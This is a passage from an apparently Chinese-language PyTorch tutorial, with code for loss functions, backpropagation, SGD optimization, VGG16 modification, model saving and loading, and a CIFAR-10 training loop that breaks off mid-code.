self.conv3(x)<br>        <span class="hljs-params">#</span> x = self.maxpool3(x)<br>        <span class="hljs-params">#</span> x = self.flatten(x)<br>        <span class="hljs-params">#</span> x = self.linear1(x)<br>        <span class="hljs-params">#</span> x = self.linear2(x)<br><br>        x = self.model1(x)          <span class="hljs-params">#</span>适配sequential<br>        return x<br><br><br>jimi = Jimi()<br>print(jimi)<br><br><br>input = torch.ones((64,3,32,32))<br>output = jimi(input)<br>print(output.shape)<br><br>writer = SummaryWriter(log<span class="hljs-built_in">_</span>dir=&quot;logs/nn<span class="hljs-built_in">_</span>seq&quot;)<br>writer.add<span class="hljs-built_in">_</span>graph(jimi,input)<br>writer.close()<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/24.png"></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/25.png"></p><h1 id="12-神经网络-损失函数与反向传播"><a href="#12-神经网络-损失函数与反向传播" class="headerlink" title="12.神经网络-损失函数与反向传播"></a>12.神经网络-损失函数与反向传播</h1><h2 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h2><p>损失函数是用来<strong>衡量模型预测结果与真实结果之间差距的函数</strong>。它给出一个标量值，表示模型当前的预测有多差，损失值越小，模型预测越准确。</p><p>在训练过程中，我们的目标就是<strong>最小化损失函数</strong>，通过不断调整模型参数，使模型预测结果越来越接近真实标签。</p><p><strong>反向传播</strong>是用于计算损失函数对神经网络中每个参数的梯度的算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> L1Loss<br><br>inputs = torch.tensor([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],dtype=torch.float32)<br>targets = torch.tensor([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>],dtype=torch.float32)<br>inputs = torch.reshape(inputs,(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>))<br>targets = torch.reshape(targets,(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>))<br><br>loss = L1Loss(reduction=<span class="hljs-string">&#x27;sum&#x27;</span>)<span class="hljs-comment"># |1-1| + |2-2| + |3-5| = 0 + 0 + 2 = 2</span><br>result = loss(inputs,targets)<br><br>loss_mse = nn.MSELoss()<span class="hljs-comment"># ((1-1)^2 + (2-2)^2 + (3-5)^2) / 3 = (0 + 0 + 4) / 3 = 1.333...</span><br>result_mse = loss_mse(inputs,targets)<br><br><span class="hljs-built_in">print</span>(result)           <span class="hljs-comment"># tensor(2.)</span><br><span class="hljs-built_in">print</span>(result_mse)       <span class="hljs-comment"># tensor(1.3333)</span><br><br><br><br>x = torch.tensor([<span class="hljs-number">0.1</span>,<span class="hljs-number">0.2</span>,<span class="hljs-number">0.3</span>])<br>y = torch.tensor([<span class="hljs-number">1</span>])<br>x = torch.reshape(x,(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>))<br>loss_cross = nn.CrossEntropyLoss()<br>result_cross = loss_cross(x,y)<br><span class="hljs-built_in">print</span>(result_cross)         <span class="hljs-comment"># tensor(1.1019)</span><br><br><span class="hljs-comment"># 计算公式：对应下图</span><br><span class="hljs-comment"># result_cross = -x[1] + log(exp(x[0]) + exp(x[1]) + exp(x[2]))</span><br><span class="hljs-comment">#         = -0.2 + log(exp(0.1) + exp(0.2) + exp(0.3))</span><br><span class="hljs-comment">#        = -0.2 + log(1.1052 + 1.2214 + 1.3499)</span><br><span class="hljs-comment">#       = -0.2 + log(3.6765)</span><br><span class="hljs-comment">#       ≈ -0.2 + 1.3019 ≈ 1.1019</span><br><br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/26.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> Sequential, Conv2d, MaxPool2d, Flatten, Linear<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><br>dataset = torchvision.datasets.CIFAR10(<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">False</span>,download=<span class="hljs-literal">True</span>,transform=torchvision.transforms.ToTensor())<br>dataloader = DataLoader(dataset,batch_size=<span class="hljs-number">64</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jimi</span>(nn.Module):<br>    <span class="hljs-comment">#要确保自己写的网络是正确的（参数不对的话是不会直接报错的）</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Jimi,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.model1 = Sequential(  <span class="hljs-comment"># 依次执行以下步骤</span><br>            Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">32</span>, <span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>),<br>            MaxPool2d(<span class="hljs-number">2</span>),<br>            Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>),<br>            MaxPool2d(<span class="hljs-number">2</span>),<br>            Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>),<br>            MaxPool2d(<span class="hljs-number">2</span>),<br>            Flatten(),<br>            Linear(<span class="hljs-number">1024</span>, <span class="hljs-number">64</span>),<br>            Linear(<span class="hljs-number">64</span>, <span class="hljs-number">10</span>)<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        x = <span class="hljs-variable language_">self</span>.model1(x)  <span class="hljs-comment"># 适配sequential</span><br>        <span class="hljs-keyword">return</span> x<br><br>loss = nn.CrossEntropyLoss()<br><br>jimi = Jimi()<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> dataloader:<br>    imgs,targets = data<br>    outputs = jimi(imgs)<br>    <span class="hljs-built_in">print</span>(targets)<br>    <span class="hljs-built_in">print</span>(outputs)<br>    result_loss = loss(outputs,targets)<br>    <span class="hljs-built_in">print</span>(result_loss)<br><span class="hljs-comment"># 反向传播,下断点之后可以查看全部的参数变量</span><br><span class="hljs-comment"># backward可以查看每个节点的grad参数，有了grad参数可以选择合适的优化器，降低loss！</span><br>    result_loss.backward()            <br></code></pre></td></tr></table></figure><h1 id="13-神经网络-优化器（训练）"><a href="#13-神经网络-优化器（训练）" class="headerlink" title="13.神经网络-优化器（训练）"></a>13.神经网络-优化器（训练）</h1><p><a href="https://docs.pytorch.org/docs/stable/optim.html">https://docs.pytorch.org/docs/stable/optim.html</a></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/27.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch.optim<br><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.nn <span class="hljs-keyword">import</span> Sequential, Conv2d, MaxPool2d, Flatten, Linear<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><br>dataset = torchvision.datasets.CIFAR10(<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">False</span>,download=<span class="hljs-literal">True</span>,transform=torchvision.transforms.ToTensor())<br>dataloader = DataLoader(dataset,batch_size=<span class="hljs-number">64</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jimi</span>(nn.Module):<br>    <span class="hljs-comment">#要确保自己写的网络是正确的（参数不对的话是不会直接报错的）</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Jimi,<span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.model1 = Sequential(  <span class="hljs-comment"># 依次执行以下步骤</span><br>            Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">32</span>, <span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>),<br>            MaxPool2d(<span class="hljs-number">2</span>),<br>            Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>),<br>            MaxPool2d(<span class="hljs-number">2</span>),<br>            Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>),<br>            MaxPool2d(<span class="hljs-number">2</span>),<br>            Flatten(),<br>            Linear(<span class="hljs-number">1024</span>, <span class="hljs-number">64</span>),<br>            Linear(<span class="hljs-number">64</span>, <span class="hljs-number">10</span>)<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self,x</span>):<br>        x = <span class="hljs-variable language_">self</span>.model1(x)  <span class="hljs-comment"># 适配sequential</span><br>        <span class="hljs-keyword">return</span> x<br><br>loss = nn.CrossEntropyLoss()<br><br>jimi = Jimi()<br>optim = torch.optim.SGD(jimi.parameters(),lr=<span class="hljs-number">0.01</span>)     <span class="hljs-comment"># 定义优化器</span><br><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):         <span class="hljs-comment">#每一轮 epoch 内都会对所有训练样本进行一次前向传播 + 反向传播</span><br>    running_loss = <span class="hljs-number">0.0</span><span class="hljs-comment">#每一轮epoch都需要重新计算损失</span><br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> dataloader:<br>        imgs,targets = data<br>        outputs = jimi(imgs)<br>        <span class="hljs-comment">#print(targets)</span><br>        <span class="hljs-comment">#print(outputs)</span><br>        result_loss = loss(outputs,targets)<br>        optim.zero_grad()               <span class="hljs-comment">#优化器进行梯度清零</span><br>        result_loss.backward()          <span class="hljs-comment">#损失函数的反向传播，求出每一个节点的梯度</span><br>        optim.step()                    <span class="hljs-comment">#对模型的每一个参数进行调优</span><br>        running_loss = running_loss + result_loss<span class="hljs-comment">#输出当前epoch中所有batch的总损失之和</span><br>    <span class="hljs-built_in">print</span>(running_loss)<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/28.png"></p><h1 id="14-现有模型的使用和修改"><a href="#14-现有模型的使用和修改" class="headerlink" title="14.现有模型的使用和修改"></a>14.现有模型的使用和修改</h1><p>模型：VGG-16</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torchvision                         <span class="hljs-comment"># 导入 torchvision 库，包含常用的计算机视觉工具、模型和数据集</span><br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn                      <span class="hljs-comment"># 从 PyTorch 中导入神经网络模块</span><br><br><span class="hljs-comment"># 加载 VGG16 模型，不加载预训练参数（用于自定义训练）</span><br>vgg16_false = torchvision.models.vgg16(pretrained=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># 加载 VGG16 模型，并加载 ImageNet 上预训练的参数（用于迁移学习）</span><br>vgg16_true = torchvision.models.vgg16(pretrained=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># 打印 vgg16_true 模型结构，包含 features 和 classifier 两部分</span><br><span class="hljs-built_in">print</span>(vgg16_true)<br><br><span class="hljs-comment"># 下载 CIFAR-10 训练数据集，并将图片转换为 Tensor 格式（归一化至 [0,1]）</span><br>train_data = torchvision.datasets.CIFAR10(<br>    <span class="hljs-string">&#x27;./download_dataset&#x27;</span>,                             <span class="hljs-comment"># 数据保存路径</span><br>    train=<span class="hljs-literal">True</span>,                                       <span class="hljs-comment"># 下载训练集</span><br>    transform=torchvision.transforms.ToTensor(),      <span class="hljs-comment"># 图像转换为 Tensor</span><br>    download=<span class="hljs-literal">True</span>                                     <span class="hljs-comment"># 如果数据不存在则下载</span><br>)<br><br><span class="hljs-comment"># 在 vgg16_true 的 classifier 最后添加一层 Linear 层（从1000维输出映射到10类）</span><br><span class="hljs-comment"># 注意：这样做等于在原输出层后“追加”一层，而不是替换</span><br>vgg16_true.classifier.add_module(<span class="hljs-string">&#x27;add_linear&#x27;</span>, nn.Linear(<span class="hljs-number">1000</span>, <span class="hljs-number">10</span>))<br><br><span class="hljs-comment"># 打印修改后的 vgg16_true 模型结构</span><br><span class="hljs-built_in">print</span>(vgg16_true)<br><br><span class="hljs-comment"># 打印未加载预训练权重的 vgg16_false 模型结构</span><br><span class="hljs-built_in">print</span>(vgg16_false)<br><br><span class="hljs-comment"># 替换 vgg16_false 中 classifier 的第 6 层（即最后一层），将输出从 1000 改为 10 类</span><br>vgg16_false.classifier[<span class="hljs-number">6</span>] = nn.Linear(<span class="hljs-number">4096</span>, <span class="hljs-number">10</span>)<br><br><span class="hljs-comment"># 打印修改后的 vgg16_false 模型结构</span><br><span class="hljs-built_in">print</span>(vgg16_false)<br><br></code></pre></td></tr></table></figure><h1 id="15-模型的保存与读取"><a href="#15-模型的保存与读取" class="headerlink" title="15.模型的保存与读取"></a>15.模型的保存与读取</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><h4 id="模型的保存："><a href="#模型的保存：" class="headerlink" title="模型的保存："></a>模型的保存：</h4><p>不安全</p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/29.png"></p><h4 id="模型的读取："><a href="#模型的读取：" class="headerlink" title="模型的读取："></a>模型的读取：</h4><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/30.png"></p><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><h4 id="保存："><a href="#保存：" class="headerlink" title="保存："></a>保存：</h4><p>官方推荐：状态 _ 字典</p><p>保存成字典形式，占用空间小</p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/31.png"></p><h4 id="读取："><a href="#读取：" class="headerlink" title="读取："></a>读取：</h4><p>直接读取的话是字典形式</p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/32.png"></p><p>需要转换一下</p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/33.png"></p><h1 id="16-完整的模型训练流程"><a href="#16-完整的模型训练流程" class="headerlink" title="16.完整的模型训练流程"></a>16.完整的模型训练流程</h1><p>数据集：CLFAR10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jimi</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Jimi, <span class="hljs-variable language_">self</span>).__init__()<br>        <span class="hljs-variable language_">self</span>.model = nn.Sequential(<br>            nn.Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">32</span>, <span class="hljs-number">5</span>, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">2</span>),<br>            nn.MaxPool2d(<span class="hljs-number">2</span>),<br>            nn.Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>),<br>            nn.MaxPool2d(<span class="hljs-number">2</span>),<br>            nn.Conv2d(<span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>),<br>            nn.MaxPool2d(<span class="hljs-number">2</span>),<br>            nn.Flatten(),<br>            nn.Linear(<span class="hljs-number">64</span> * <span class="hljs-number">4</span> * <span class="hljs-number">4</span>, <span class="hljs-number">64</span>),<br>            nn.Linear(<span class="hljs-number">64</span>, <span class="hljs-number">10</span>)<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = <span class="hljs-variable language_">self</span>.model(x)<br>        <span class="hljs-keyword">return</span> x<br><br><br><span class="hljs-comment"># 验证网络的正确性</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    jimi = Jimi()<br>    <span class="hljs-built_in">input</span> = torch.ones((<span class="hljs-number">64</span>, <span class="hljs-number">3</span>, <span class="hljs-number">32</span>, <span class="hljs-number">32</span>))  <span class="hljs-comment"># 64张彩色图片，每张图的大小是 32×32 像素，而且是 RGB三通道的。</span><br>    output = jimi(<span class="hljs-built_in">input</span>)<br>    <span class="hljs-built_in">print</span>(output.shape)             <span class="hljs-comment"># torch.Size([64, 10])</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><span class="hljs-keyword">from</span> torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><br><span class="hljs-keyword">from</span> modelCode <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    device = torch.device(<span class="hljs-string">&quot;cuda&quot;</span> <span class="hljs-keyword">if</span> torch.cuda.is_available() <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;cpu&quot;</span>)<br><br>    <span class="hljs-comment"># 准备数据集</span><br>    train_data = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&quot;./download_dataset&quot;</span>, train=<span class="hljs-literal">True</span>, download=<span class="hljs-literal">True</span>, transform=torchvision.transforms.ToTensor())<br>    test_data = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&quot;./download_dataset&quot;</span>, train=<span class="hljs-literal">False</span>, download=<span class="hljs-literal">True</span>, transform=torchvision.transforms.ToTensor())<br><br>    <span class="hljs-comment"># 长度</span><br>    train_data_size = <span class="hljs-built_in">len</span>(train_data)<br>    test_data_size = <span class="hljs-built_in">len</span>(test_data)<br>    <span class="hljs-comment"># 如果train_data_size=10，训练数据集的长度为：10</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;训练数据集的长度为：&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(train_data_size))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;测试数据集的长度为：&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(test_data_size))<br><br>    <span class="hljs-comment"># 利用dataloader来加载数据集</span><br>    num_workers = <span class="hljs-built_in">min</span>(<span class="hljs-number">4</span>, os.cpu_count())<br>    train_dataloader = DataLoader(train_data, <span class="hljs-number">256</span>, shuffle=<span class="hljs-literal">True</span>, num_workers=num_workers, pin_memory=<span class="hljs-literal">True</span>)<br>    test_dataloader = DataLoader(test_data, <span class="hljs-number">64</span>,pin_memory=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># 搭建神经网络</span><br>    <span class="hljs-comment"># modelCode</span><br><br>    <span class="hljs-comment"># 创建网络模型</span><br>    jimi = Jimi().to(device)<br><br>    <span class="hljs-comment"># 损失函数</span><br>    loss_fn = nn.CrossEntropyLoss()<br><br>    <span class="hljs-comment"># 优化器</span><br>    <span class="hljs-comment"># learning_rate = 0.01</span><br>    learning_rate = <span class="hljs-number">1e-2</span>            <span class="hljs-comment"># 1 × 10^(-2) = 0.01</span><br>    optimizer = torch.optim.SGD(jimi.parameters(),lr=learning_rate)<br><br>    <span class="hljs-comment"># 设置训练网络的一些参数</span><br>    <span class="hljs-comment"># 记录训练的次数</span><br>    total_train_step = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 记录测试的次数</span><br>    total_test_step = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 训练的轮数</span><br>    epoch = <span class="hljs-number">10</span><br><br>    <span class="hljs-comment"># tensorboard</span><br>    writer = SummaryWriter(<span class="hljs-string">&quot;./logs/train_data&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(epoch):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------------------第&#123;&#125;轮训练开始----------------------------&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>))<br><br>        <span class="hljs-comment"># 开始训练</span><br>        <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> train_dataloader:<br>            imgs, targets = data<br>            imgs = imgs.to(device)<br>            targets = targets.to(device)<br><br>            output = jimi(imgs)<br><br>            <span class="hljs-comment"># 损失计算</span><br>            loss = loss_fn(output, targets)<br><br>            <span class="hljs-comment"># 优化器优化模型</span><br>            optimizer.zero_grad()       <span class="hljs-comment"># 对优化器进行梯度清零</span><br>            loss.backward()             <span class="hljs-comment"># 